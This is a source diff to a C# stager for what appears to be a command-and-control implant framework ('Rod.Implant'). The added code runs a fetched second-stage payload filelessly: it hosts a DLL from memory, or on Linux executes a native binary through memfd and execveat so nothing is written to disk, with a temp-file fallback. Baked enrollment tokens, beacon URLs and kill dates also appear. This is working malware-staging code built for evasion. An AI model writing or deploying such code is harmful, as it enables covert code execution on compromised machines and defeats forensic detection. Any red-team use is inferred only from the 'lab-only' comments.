@@ -132,11 +132,44 @@ internal static class StagerApp
             return 1;
         }
 
-        // The fetched artifact is a self-contained single-file executable
-        // (architecture.md Sec 6); running it means executing the file. The
-        // stage-2's own baked profile carries everything it needs --
-        // endpoint, credential, cadence -- so nothing operational is handed
-        // across the process boundary.
+        // The baked stage-2 format picks the run path: a dll bundle is
+        // hosted in this process (loaded from memory, no byte of the stage-2
+        // on any filesystem); the native AOT form runs as the child from
+        // memory on Linux (memfd + execveat: the loader's process image
+        // becomes the stage-2) -- an AOT binary is a plain ELF with no
+        // self-reference, the one executable shape an anonymous fd can
+        // carry; every other executable form (the single-file bundles) reads
+        // its own file to mount the runtime, so it writes the temp file
+        // below. The lab-only env forwards serve an unbaked dev stage-2, so
+        // the in-memory child path -- which cannot forward anything across
+        // an execve -- only takes a fielded bake.
+        if (string.Equals(BakedStage2Format, "dll", StringComparison.OrdinalIgnoreCase))
+        {
+            log.WriteLine($"rod-stager: hosting stage-2 in memory ({stage2.Length} bytes)");
+            return await Stage2Loader.RunDllAsync(stage2, cts.Token);
+        }
+        if (OperatingSystem.IsLinux()
+            && string.Equals(BakedStage2Format, "aot", StringComparison.OrdinalIgnoreCase)
+            && beaconUrl is null && caCertPath is null)
+        {
+            try
+            {
+                log.WriteLine($"rod-stager: running stage-2 from memory ({stage2.Length} bytes)");
+                Stage2Loader.RunMemfd(stage2);
+            }
+            catch (Exception ex)
+            {
+                log.WriteLine($"rod-stager: memfd exec unavailable ({ex.Message}); writing a temp file instead");
+            }
+        }
+
+        // The temp-file child path (Windows, pre-3.17 Linux, and the dev
+        // shape's forwarded runs): the fetched artifact is a self-contained
+        // single-file executable (architecture.md Sec 6); running it means
+        // executing the file. The stage-2's own baked profile carries
+        // everything it needs -- endpoint, credential, cadence -- so nothing
+        // operational is handed across the process boundary beyond the two
+        // lab-only forwards.
         var stage2Path = Path.Combine(outDir, OperatingSystem.IsWindows() ? "Rod.Implant.exe" : "Rod.Implant");
         try
         {
@@ -194,6 +227,11 @@ internal static class StagerApp
     private static string BakedEnrollUrl { get; set; } = "";
 
     private static string BakedPayloadId { get; set; } = "";
+
+    // The fetched stage-2's form factor ("dll" or an executable shape), baked
+    // by the build off the referenced payload's recorded format. Empty -- an
+    // older bake -- reads as the executable default.
+    private static string BakedStage2Format { get; set; } = "";
 
     private static (string Token, string EnrollUrl, string PayloadId, string OutDir, string? BeaconUrl, string? CaCertPath) ParseArgs(
         string[] args)
@@ -270,6 +308,7 @@ internal static class StagerApp
             var root = doc.RootElement;
             BakedString(root, "enrollURL", value => BakedEnrollUrl = value);
             BakedString(root, "stage2PayloadId", value => BakedPayloadId = value);
+            BakedString(root, "stage2Format", value => BakedStage2Format = value);
             BakedString(root, "token", value => BakedToken = value);
             BakedString(root, "stage2Sha256", value => ExpectedSha256 = value);
             BakedString(root, "killDate", value => BakedKillDate = value);
